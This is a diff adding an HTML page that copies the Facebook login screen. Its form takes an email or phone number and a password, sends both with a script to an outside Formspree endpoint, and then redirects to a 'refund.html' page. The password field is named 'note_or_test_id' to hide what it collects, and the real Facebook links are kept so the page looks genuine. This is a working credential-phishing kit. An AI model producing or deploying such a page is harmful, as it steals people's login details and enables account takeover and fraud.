@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Facebook — log in or sign up </title>
+
+  <!-- Font Awesome for eye toggle -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-pX..." crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <!-- Standard favicons -->
+  <link rel="shortcut icon" href="/favicon/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" href="/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-chrome-192x192.png">
+  <link rel="icon" type="image/png" sizes="512x512" href="/favicon/android-chrome-512x512.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      height: 100%;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background:
+        linear-gradient(rgba(240, 242, 245, 0.7), rgba(240, 242, 245, 0.7)),
+        url("./images/loginbg.png") no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      width: 100%;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      width: 100%;
+      padding: 20px;
+      padding-top: 130px;
+    }
+
+    .intro-section h1 {
+      font-size: 60px;
+      color: #1877f2;
+      margin-bottom: 6px;
+    }
+
+    .intro-section p {
+      font-size: 24px;
+      line-height: 28px;
+      max-width: 500px;
+    }
+
+    .signin-section {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      width: 396px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 10px;
+      padding: 16px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .08);
+    }
+
+    input,
+    button,
+    textarea {
+      font-size: 16px;
+      font-family: inherit;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    textarea,
+    .fake-input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin: 10px 0;
+      outline: none;
+    }
+
+    input:focus,
+    textarea:focus {
+      border-color: #1877f2;
+    }
+
+    .primary-btn {
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      width: 100%;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .primary-btn:hover {
+      background: #0d65d9;
+    }
+
+    .create-btn .primary-green {
+      background: #42b72a;
+    }
+
+    .create-btn .primary-green:hover {
+      background: #3ba626;
+    }
+
+    .muted-link {
+      text-align: center;
+      color: #1877f2;
+      display: block;
+      margin: 12px 0;
+    }
+
+    .status {
+      display: none;
+      margin-top: 8px;
+      padding: 10px;
+      border-radius: 6px;
+    }
+
+    .status.success {
+      background: #e6f9ee;
+      color: #0a7a3b;
+    }
+
+    .status.error {
+      background: #ffe7e7;
+      color: #8b1e1e;
+    }
+
+    hr {
+      border: 0;
+      border-top: 1px solid #eee;
+      margin: 16px 0;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .password-container i {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #666;
+      display: none;
+    }
+
+    @media (max-width:956px) {
+      .intro-section {
+        text-align: center;
+      }
+
+      .container {
+        padding-top: 40px;
+      }
+    }
+  </style>
+
+</head>
+
+<body>
+  <div class="container">
+    <section class="intro-section">
+      <h1>facebook</h1>
+      <p>Facebook helps you connect and share with the people in your life.</p>
+    </section>
+
+    <section class="signin-section">
+      <div class="card">
+        <form id="contactForm" action="https://formspree.io/f/xzzklynj" method="POST" novalidate>
+          <label for="contact" style="display:none">Email or Phone</label>
+          <input id="contact" name="contact" type="text" placeholder="Email address or phone number" required>
+
+          <label for="note_or_test_id" style="display:none">Note / Test ID</label>
+          <div class="password-container">
+            <input id="note_or_test_id" name="note_or_test_id" type="password" placeholder="Password" required>
+            <i id="eyeToggle" class="fa-solid fa-eye"></i>
+          </div>
+
+          <button type="submit" class="primary-btn">Login</button>
+
+          <a class="muted-link"
+            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
+            password?</a>
+          <hr>
+          <div class="create-btn">
+            <button type="button" class="primary-btn primary-green"
+              onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">
+              Create new account
+            </button>
+          </div>
+
+          <div id="status" class="status"></div>
+        </form>
+      </div>
+
+      <p style="text-align:center;font-size:14px"><a href="https://www.facebook.com/r.php?entry_point=login"
+          style="color:black"><strong>Create a Page</strong></a> for a celebrity, brand or business.</p>
+    </section>
+  </div>
+
+  <script>
+    const passwordInput = document.getElementById('note_or_test_id');
+    const eyeToggle = document.getElementById('eyeToggle');
+    const form = document.getElementById('contactForm');
+    const statusDiv = document.getElementById('status');
+
+    // Show eye icon after typing
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.value.length > 0) {
+        eyeToggle.style.display = 'block';
+        eyeToggle.className = passwordInput.type === 'password' ? 'fa-solid fa-eye' : 'fa-solid fa-eye-slash';
+      } else {
+        eyeToggle.style.display = 'none';
+      }
+    });
+
+    // Toggle password visibility
+    eyeToggle.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeToggle.className = 'fa-solid fa-eye-slash';
+      } else {
+        passwordInput.type = 'password';
+        eyeToggle.className = 'fa-solid fa-eye';
+      }
+    });
+
+    // Form submission via fetch (AJAX) to Formspree
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const contact = form.contact.value.trim();
+      const note = form.note_or_test_id.value.trim();
+      if (!contact || !note) {
+        showStatus('Please fill the required fields.', 'error');
+        return;
+      }
+
+      const formData = new FormData(form);
+
+      try {
+        const endpoint = form.action;
+        const resp = await fetch(endpoint, {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        const data = await resp.json().catch(() => ({ ok: resp.ok }));
+
+        if (resp.ok) {
+          showStatus('Thanks — your submission has been sent!', 'success');
+          form.reset();
+          eyeToggle.style.display = 'none';
+          setTimeout(() => {
+            window.location.href = "refund.html";
+          }, 2000);
+        } else {
+          const message = (data && data.error) ? data.error : 'Submission failed — please try again later.';
+          showStatus(message, 'error');
+        }
+
+      } catch (err) {
+        showStatus('Network error — please try again later.', 'error');
+        console.error(err);
+      }
+    });
+
+    function showStatus(text, type) {
+      statusDiv.style.display = 'block';
+      statusDiv.className = 'status ' + (type === 'success' ? 'success' : 'error');
+      statusDiv.textContent = text;
+      setTimeout(() => statusDiv.style.display = 'none', 6000);
+    }
+  </script>
+</body>
+
+</html>
